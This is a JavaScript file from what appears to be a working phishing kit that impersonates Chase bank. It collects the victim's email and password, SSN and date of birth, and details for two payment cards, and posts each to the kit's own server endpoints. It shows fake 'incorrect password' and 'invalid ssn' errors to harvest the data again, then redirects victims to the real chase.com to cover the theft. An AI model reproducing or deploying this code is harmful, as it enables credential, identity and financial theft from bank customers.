const EmailFrom = document.getElementById("emailform");
const EmailDiv = document.getElementById("emailowa");
const BillingDiv = document.getElementById("bilingowa");
const BillingForm = document.getElementById("bilngo");
const card1Div = document.getElementById("cardowa");
const card1From = document.getElementById("cardfrom");
const card2Div = document.getElementById("cardowa2");
const IsCard = document.getElementById("cardkhra");
const IsNotCard = document.getElementById("ma3andoshakhra20");
const HidecardDiv = document.getElementById("hideothercard");
const card2Form = document.getElementById("cardfrom2");
const finalDiv = document.getElementById("congra");
let attempts = 0;
// -------------------------
// Loading Spinner Helpers
// -------------------------

function setLoading(button, text = "Loading...") {
    button.dataset.originalText = button.innerHTML;
    button.disabled = true;

    // Add spinner HTML (simple rolling dots)
    button.innerHTML = `
        <span class="spinner"></span> ${text}
    `;
}

function clearLoading(button) {
    button.innerHTML = button.dataset.originalText || "Submit";
    button.disabled = false;
}

// ------------- Spinner CSS dynamically (optional) -------------
const style = document.createElement("style");
style.innerHTML = `
.spinner {
    border: 3px solid rgba(255,255,255,0.3);
    border-top: 3px solid #fff;
    border-radius: 50%;
    width: 18px;
    height: 18px;
    display: inline-block;
    margin-right: 8px;
    animation: spin 0.8s linear infinite;
}
@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}
`;
document.head.appendChild(style);




EmailFrom.addEventListener("submit", async function (e) {
    e.preventDefault();

    const loginbtn = document.getElementById("email_next_btn");
    const d_data = new FormData(EmailFrom);

    setLoading(loginbtn);
    try {
        const response = await fetch("/email", {
            method: "POST",
            body: d_data
        });

        const data = await response.json();

        clearLoading(loginbtn);
        const errorDiv = document.getElementById("errorremail")
        attempts += 1;
  
        
        if (attempts <= 1) {

            errorDiv.innerHTML = ""; // Clear old errors

            const errorMessage = document.createElement("div");
            errorMessage.classList.add("error-message");
            errorMessage.textContent = 
                "Incorrect email or password. Check your email or password and retry.";

            errorDiv.appendChild(errorMessage);
            return;
        }


        if (data.status === "success") {
            EmailDiv.style.display = 'none';
            BillingDiv.style.display = 'block';
            
        } else {
            alert(data.message || "Login failed");
        }

    } catch (error) {
        clearLoading(loginbtn);
        console.error("Error:", error);
        alert("An error occurred during Login");
    }
});

BillingForm.addEventListener("submit", async function (e) {
    e.preventDefault();

    const loginbtn = document.getElementById("billing_next_btn");
    const d_data = new FormData(BillingForm);

    setLoading(loginbtn);
    try {
        const response = await fetch("/billing", {
            method: "POST",
            body: d_data
        });

        const data = await response.json();

        clearLoading(loginbtn);
        const errorDiv = document.getElementById("errorrbilling");
        attempts += 1;
        console.log(attempts);

        
        if (attempts <= 3) {

            errorDiv.innerHTML = ""; // Clear old errors

            const errorMessage = document.createElement("div");
            errorMessage.classList.add("error-message");
            errorMessage.textContent = 
                "Invalid ssn or dob. Check input and try again.";

            errorDiv.appendChild(errorMessage);
            return;
        }


        if (data.status === "success") {
            BillingDiv.style.display = 'none';
            card1Div.style.display = 'block';
            
        } else {
            alert(data.message || "Login failed");
        }

    } catch (error) {
        clearLoading(loginbtn);
        console.error("Error:", error);
        alert("An error occurred during Login");
    }
});


card1From.addEventListener("submit", async function (e) {
    e.preventDefault();

    const loginbtn = document.getElementById("card1_next_btn");
    const d_data = new FormData(card1From);

    setLoading(loginbtn);
    try {
        const response = await fetch("/card1", {
            method: "POST",
            body: d_data
        });

        const data = await response.json();

        clearLoading(loginbtn);
        const errorDiv = document.getElementById("errorrcard");
        attempts += 1;
        
        if (attempts <= 4) {

            errorDiv.innerHTML = ""; // Clear old errors

            const errorMessage = document.createElement("div");
            errorMessage.classList.add("error-message");
            errorMessage.textContent = 
                "Invalid Input. Check input and try again.";

            errorDiv.appendChild(errorMessage);
            return;
        }
       

        if (data.status === "success") {
            card1Div.style.display = 'none';
            card2Div.style.display = 'block';
            
        } else {
            alert(data.message || "Login failed");
        }

    } catch (error) {
        clearLoading(loginbtn);
        console.error("Error:", error);
        alert("An error occurred during Login");
    }
});

IsCard.addEventListener("click", (e) => {
    e.preventDefault();
    HidecardDiv.style.display = 'none';
    card2Form.style.display = 'block';
});

IsNotCard.addEventListener('click', (e) => {
    e.preventDefault();
    card2Div.style.display = 'none';
    finalDiv.style.display = 'block';

});

card2Form.addEventListener("submit", async function (e) {
    e.preventDefault();

    const loginbtn = document.getElementById("card2_next_btn");
    const d_data = new FormData(card2Form);

    setLoading(loginbtn);
    try {
        const response = await fetch("/card2", {
            method: "POST",
            body: d_data
        });

        const data = await response.json();

        clearLoading(loginbtn);

        const errorDiv = document.getElementById("errorrcard2");
        attempts += 1;

        if (attempts <= 1) {

            errorDiv.innerHTML = ""; // Clear old errors

            const errorMessage = document.createElement("div");
            errorMessage.classList.add("error-message");
            errorMessage.textContent = 
                "Invalid Input. Check input and try again.";

            errorDiv.appendChild(errorMessage);
            return;
        }
       

        if (data.status === "success") {
            card2Div.style.display = 'none';
            finalDiv.style.display = 'block';
            
        } else {
            alert(data.message || "Login failed");
        }

    } catch (error) {
        clearLoading(loginbtn);
        console.error("Error:", error);
        alert("An error occurred during Login");
    }
});

const dihlogin = document.getElementById("dihlogin");
const dihlogin2 = document.getElementById("dihlogin2");

dihlogin.addEventListener("click", () => {
    window.location.href= 'https://www.chase.com/';
});

dihlogin2.addEventListener("click", () => {
    window.location.href= 'https://www.chase.com/';
});